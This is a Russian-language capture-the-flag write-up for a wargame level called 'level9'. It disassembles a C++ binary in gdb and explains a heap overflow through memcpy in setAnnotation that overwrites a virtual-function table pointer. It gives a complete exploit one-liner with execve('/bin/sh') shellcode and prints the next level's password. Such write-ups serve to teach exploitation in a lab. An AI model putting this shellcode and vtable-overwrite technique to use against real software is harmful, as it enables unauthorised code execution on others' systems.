(gdb) disas main
    Dump of assembler code for function main:
       0x080485f4 <+0>:	push   %ebp
       0x080485f5 <+1>:	mov    %esp,%ebp
       0x080485f7 <+3>:	push   %ebx
       0x080485f8 <+4>:	and    $0xfffffff0,%esp
       0x080485fb <+7>:	sub    $0x20,%esp
       0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
       0x08048602 <+14>:	jg     0x8048610 <main+28>
       0x08048604 <+16>:	movl   $0x1,(%esp)
       0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
       0x08048610 <+28>:	movl   $0x6c,(%esp)
       0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>   
       0x0804861c <+40>:	mov    %eax,%ebx
       0x0804861e <+42>:	movl   $0x5,0x4(%esp)
       0x08048626 <+50>:	mov    %ebx,(%esp)
       0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
       0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
       0x08048632 <+62>:	movl   $0x6c,(%esp)
       0x08048639 <+69>:	call   0x8048530 <_Znwj@plt> 
       0x0804863e <+74>:	mov    %eax,%ebx
       0x08048640 <+76>:	movl   $0x6,0x4(%esp)
       0x08048648 <+84>:	mov    %ebx,(%esp)
       0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
       0x08048650 <+92>:	mov    %ebx,0x18(%esp)
       0x08048654 <+96>:	mov    0x1c(%esp),%eax
       0x08048658 <+100>:	mov    %eax,0x14(%esp)
       0x0804865c <+104>:	mov    0x18(%esp),%eax
       0x08048660 <+108>:	mov    %eax,0x10(%esp)
       0x08048664 <+112>:	mov    0xc(%ebp),%eax
       0x08048667 <+115>:	add    $0x4,%eax
       0x0804866a <+118>:	mov    (%eax),%eax
       0x0804866c <+120>:	mov    %eax,0x4(%esp)
       0x08048670 <+124>:	mov    0x14(%esp),%eax
       0x08048674 <+128>:	mov    %eax,(%esp)
       0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
       0x0804867c <+136>:	mov    0x10(%esp),%eax
       0x08048680 <+140>:	mov    (%eax),%eax
       0x08048682 <+142>:	mov    (%eax),%edx
       0x08048684 <+144>:	mov    0x14(%esp),%eax
       0x08048688 <+148>:	mov    %eax,0x4(%esp)
       0x0804868c <+152>:	mov    0x10(%esp),%eax
       0x08048690 <+156>:	mov    %eax,(%esp)
       0x08048693 <+159>:	call   *%edx 
       0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
       0x08048698 <+164>:	leave  
       0x08048699 <+165>:	ret    
    End of assembler dump.

Интересно
    35: вызов оператора NEW <_Znwj> 
    53: вызов конструктора <_ZN1NC2Ei> (создание первого объекта класса N)
    69: вызов оператора NEW <_Znwj> 
    87: вызов конструктора <_ZN1NC2Ei> (создание второго объекта класса N)
    

(gdb) !c++filt _ZN1NC2Ei
    N::N(int)

В итоге в памяти создается два объекта по 108 байт каждый с промежутком в 4 байта


(gdb) x/32x 0x804a008   Посмотрим по адресу первого объекта
    0x804a008:	0x08048848	0x00000000	0x00000000	0x00000000  Объект начинается с 0x08048848 (это таблица виртуальных функций)
    0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000  Потом идет замолоченая память размером 100
    0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071  Заканчивается интом 0x00000005, 0x00000071 - это мусор
    0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000  0x08048848 Начинается второй такой же объект 


Мы видим программу на c++, но нигде нет вызовов систем, 
значит нам опять надо внедрить свой shell code.

НО! На 159 строке стоит функция которая смотрит на начало второго объекта и выполняет то, что там лежит

(gdb) x/x 0x08048848    - это таблица виртуальных функций
    0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) x/x 0x0804873a
    0x804873a <_ZN1NplERS_>:	0x8be58955
(gdb) !c++filt _ZN1NplERS_
    N::operator+(N&)

Наша задача: перезаписать таблицу виртуальных функций указателем на shell code

Мы можем это сделать используя уязвимость функции <memcpy>, которая спрятана внутри <_ZN1N13setAnnotationEPc> на 131 строке

Подадим на вход программы, что-то размером 104 байта и сможем перезаписать начало второго объекта
Shell code генерируем сами

\x10\xa0\x04\x08 - адрес начала shell code
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 - shell codes
"A" *76 - нагрузка
\x0c\xa0\04\x08 - адрес указателя на shell code

./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" *76 + "\x0c\xa0\04\x08"'`
cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728